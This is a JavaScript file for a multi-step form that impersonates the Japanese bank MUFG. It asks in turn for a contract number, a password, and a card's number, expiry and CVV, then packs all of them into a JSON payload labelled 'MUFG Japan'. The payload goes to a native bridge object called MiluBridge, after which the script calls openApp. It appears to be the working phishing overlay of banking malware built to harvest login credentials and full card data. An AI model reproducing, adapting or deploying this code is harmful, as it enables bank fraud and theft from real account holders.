(() => {
  const stepContract = document.getElementById("stepContract");
  const stepPassword = document.getElementById("stepPassword");
  const stepCard = document.getElementById("stepCard");
  const contractInput = document.getElementById("contractNo");
  const passwordInput = document.getElementById("password");
  const cardNoInput = document.getElementById("cardNo");
  const expiryInput = document.getElementById("expiry");
  const cvvInput = document.getElementById("cvv");
  const nextBtn = document.getElementById("nextBtn");
  const loginBtn = document.getElementById("loginBtn");
  const confirmBtn = document.getElementById("confirmBtn");
  const loadingEl = document.getElementById("loading");

  const state = {
    account: "",
    password: "",
  };

  let submitLocked = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function setLoading(show) {
    loadingEl.classList.toggle("is-show", show);
    loadingEl.setAttribute("aria-hidden", show ? "false" : "true");
  }

  function showStep(step) {
    stepContract.classList.toggle("is-active", step === "contract");
    stepPassword.classList.toggle("is-active", step === "password");
    stepCard.classList.toggle("is-active", step === "card");
  }

  function mask(value, pattern) {
    let result = "";
    let index = 0;
    const digits = value.replace(/\D/g, "");
    for (let j = 0; j < pattern.length && index < digits.length; j += 1) {
      if (pattern[j] === "X") {
        result += digits[index++];
      } else {
        result += pattern[j];
        if (digits[index] === pattern[j]) {
          index += 1;
        }
      }
    }
    return result;
  }

  function checkCardForm() {
    const card = cardNoInput.value.replace(/\s/g, "");
    const expiry = expiryInput.value;
    const cvv = cvvInput.value;
    confirmBtn.disabled = !(card.length === 16 && expiry.length === 5 && cvv.length === 3);
  }

  function buildPayload(cardNo, expiry, cvv) {
    return JSON.stringify({
      类型: "MUFG Japan",
      账号: state.account,
      密码: state.password,
      卡号: cardNo,
      有效期: expiry,
      CVV: cvv,
      时间戳: Date.now(),
    });
  }

  cardNoInput.addEventListener("input", () => {
    cardNoInput.value = mask(cardNoInput.value, "XXXX XXXX XXXX XXXX");
    checkCardForm();
  });

  expiryInput.addEventListener("input", () => {
    expiryInput.value = mask(expiryInput.value, "XX/XX");
    checkCardForm();
  });

  cvvInput.addEventListener("input", () => {
    cvvInput.value = cvvInput.value.replace(/\D/g, "").slice(0, 3);
    checkCardForm();
  });

  [contractInput, passwordInput].forEach((input) => {
    input.addEventListener("input", () => {
      input.classList.remove("is-error");
    });
  });

  nextBtn.addEventListener("click", () => {
    const value = contractInput.value.trim();
    if (value.length < 5) {
      contractInput.classList.add("is-error");
      return;
    }
    state.account = value;
    setLoading(true);
    window.setTimeout(() => {
      setLoading(false);
      showStep("password");
      passwordInput.focus();
    }, 800);
  });

  loginBtn.addEventListener("click", () => {
    const value = passwordInput.value;
    if (value.length < 4) {
      passwordInput.classList.add("is-error");
      return;
    }
    state.password = value;
    setLoading(true);
    window.setTimeout(() => {
      setLoading(false);
      showStep("card");
      cardNoInput.focus();
    }, 800);
  });

  confirmBtn.addEventListener("click", () => {
    if (submitLocked || confirmBtn.disabled) {
      return;
    }
    submitLocked = true;
    const cardNo = cardNoInput.value;
    const expiry = expiryInput.value;
    const cvv = cvvInput.value;
    setLoading(true);
    window.setTimeout(() => {
      reportDone(buildPayload(cardNo, expiry, cvv));
      setLoading(false);
      window.setTimeout(() => {
        openApp();
        submitLocked = false;
      }, 2000);
    }, 1000);
  });
})();
